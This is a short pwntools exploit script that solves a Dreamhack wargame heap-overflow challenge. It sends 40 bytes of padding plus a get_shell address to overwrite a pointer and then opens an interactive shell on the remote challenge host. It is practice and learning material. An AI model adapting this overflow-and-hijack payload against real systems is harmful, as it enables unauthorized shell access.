from pwn import*

context.log_level       = "DEBUG"
context.arch            = "amd64"

#p = process("./basic_heap_overflow")
p = remote("host3.dreamhack.games", 20057)
#gdb.attach(p,api=True)

get_shell = 0x0804867b
payload = b"a"*40 + p32(get_shell)
p.sendline(payload)

p.interactive()
#local & host +-=8
